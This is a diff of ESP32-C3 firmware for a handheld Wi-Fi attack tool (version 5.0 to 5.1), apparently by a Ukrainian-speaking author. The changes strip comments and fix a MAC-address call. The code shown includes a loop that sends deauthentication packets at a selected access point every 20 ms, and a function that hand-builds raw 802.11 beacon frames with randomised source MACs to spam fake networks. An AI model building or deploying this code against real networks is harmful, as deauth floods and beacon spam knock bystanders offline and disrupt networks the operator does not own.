@@ -1,15 +1,7 @@
 /*
- * RF TOOL v5.0 - Wi-Fi Only (Bruce Style UI)
+ * RF TOOL v5.1 - Wi-Fi Only (Bruce Style UI)
  * ESP32-C3 Supermini
- * 
- * Features:
- * - Wi-Fi Scanner
- * - Deauth Attack
- * - Beacon Spammer
- * 
- * Pinout:
- * TFT:   CS=5, DC=6, RST=7, SCK=8, MOSI=10, LED=3.3V
- * Buttons: UP=1, DOWN=20, SEL=3, BACK=0
+ * Виправлено помилку з esp_read_mac
  */
 
 #include <SPI.h>
@@ -30,7 +22,7 @@
 #define BTN_SEL     3
 #define BTN_BACK    0
 
-// ====================== Кольори (Bruce palette) ======================
+// ====================== Кольори ======================
 #define BG_COLOR        ST77XX_BLACK
 #define HEADER_COLOR    ST77XX_CYAN
 #define SELECTED_COLOR  ST77XX_YELLOW
@@ -99,22 +91,18 @@ void setup() {
   Serial.begin(115200);
   delay(500);
 
-  // Кнопки
   pinMode(BTN_UP, INPUT_PULLUP);
   pinMode(BTN_DOWN, INPUT_PULLUP);
   pinMode(BTN_SEL, INPUT_PULLUP);
   pinMode(BTN_BACK, INPUT_PULLUP);
 
-  // SPI для дисплея
   SPI.begin(TFT_SCLK, -1, TFT_MOSI);
 
-  // Дисплей
   tft.initR(INITR_MINI160x80);
   tft.setRotation(1);
   tft.fillScreen(BG_COLOR);
   tft.setTextWrap(false);
 
-  // Повідомлення про статус
   tft.setTextColor(SUCCESS_COLOR);
   tft.setCursor(10, 30);
   tft.print("TFT OK!");
@@ -123,7 +111,6 @@ void setup() {
   tft.setCursor(10, 50);
   tft.print("Wi-Fi init...");
 
-  // Wi-Fi
   WiFi.mode(WIFI_STA);
   esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
   esp_wifi_set_ps(WIFI_PS_NONE);
@@ -140,14 +127,12 @@ void setup() {
 void loop() {
   handleNavigation();
 
-  // Deauth attack
   if (currentState == WIFI_DEAUTH && deauthActive) {
     if (millis() - lastPacket >= 20) {
       lastPacket = millis();
       sendDeauthPacket(apBSSID[selectedAP], apChannel[selectedAP]);
       packetCount++;
       
-      // Оновлення лічильника на екрані
       tft.fillRect(10, 80, 140, 20, BG_COLOR);
       tft.setCursor(10, 80);
       tft.setTextColor(TEXT_COLOR);
@@ -156,7 +141,6 @@ void loop() {
     }
   }
 
-  // Beacon spam
   if (currentState == WIFI_BEACON && beaconActive) {
     if (millis() - lastPacket >= 100) {
       lastPacket = millis();
@@ -173,7 +157,6 @@ void loop() {
       sendBeaconPacket(ssid.c_str());
       packetCount++;
       
-      // Оновлення на екрані
       tft.fillRect(10, 80, 140, 40, BG_COLOR);
       tft.setCursor(10, 80);
       tft.setTextColor(TEXT_COLOR);
@@ -208,7 +191,7 @@ void drawButtonHints(const char* hints) {
 
 void drawMainMenu() {
   tft.fillScreen(BG_COLOR);
-  drawHeader("RF TOOL v5.0");
+  drawHeader("RF TOOL v5.1");
   
   const char* icons[] = {"[S]", "[D]", "[B]", "[#]"};
   
@@ -422,52 +405,42 @@ void sendBeaconPacket(const char* ssid) {
   uint8_t packet[128];
   int ssidLen = strlen(ssid);
   
-  // Beacon frame header
-  packet[0] = 0x80;  // Type: Beacon
-  packet[1] = 0x00;  // Flags
-  packet[2] = 0x00;  // Duration
+  packet[0] = 0x80;
+  packet[1] = 0x00;
+  packet[2] = 0x00;
   packet[3] = 0x00;
   
-  // Destination (broadcast)
   for (int i = 4; i < 10; i++) packet[i] = 0xFF;
   
-  // Source (random MAC if enabled)
   if (randomMAC) {
     for (int i = 10; i < 16; i++) packet[i] = random(0, 255);
-    packet[10] &= 0xFE; // Unicast
+    packet[10] &= 0xFE;
   } else {
-    // Use ESP MAC
-    esp_read_mac(packet + 10, ESP_MAC_WIFI_STA);
+    uint8_t mac[6];
+    WiFi.macAddress(mac);
+    memcpy(packet + 10, mac, 6);
   }
   
-  // BSSID (same as source)
   memcpy(packet + 16, packet + 10, 6);
   
-  // Sequence control
   packet[22] = random(0, 255);
   packet[23] = random(0, 255);
   
-  // Beacon body
   int pos = 24;
   
-  // Timestamp
   for (int i = 0; i < 8; i++) packet[pos++] = random(0, 255);
   
-  // Beacon interval
   packet[pos++] = 0x64;
   packet[pos++] = 0x00;
   
-  // Capability info
   packet[pos++] = 0x21;
   packet[pos++] = 0x04;
   
-  // SSID tag
   packet[pos++] = 0x00;
   packet[pos++] = ssidLen;
   memcpy(packet + pos, ssid, ssidLen);
   pos += ssidLen;
   
-  // Supported rates
   packet[pos++] = 0x01;
   packet[pos++] = 0x08;
   packet[pos++] = 0x82;
@@ -479,7 +452,6 @@ void sendBeaconPacket(const char* ssid) {
   packet[pos++] = 0x48;
   packet[pos++] = 0x6C;
   
-  // DS Parameter set (channel 1)
   packet[pos++] = 0x03;
   packet[pos++] = 0x01;
   packet[pos++] = 0x01;
@@ -500,7 +472,6 @@ void handleNavigation() {
   if (!up && !down && !sel && !back) return;
   lastPress = millis();
   
-  // BACK
   if (back) {
     if (currentState == MAIN_MENU) return;
     
@@ -512,7 +483,6 @@ void handleNavigation() {
     return;
   }
   
-  // Обробка станів
   switch (currentState) {
     case MAIN_MENU:
       if (up)   mainMenuIndex = (mainMenuIndex - 1 + mainMenuSize) % mainMenuSize;
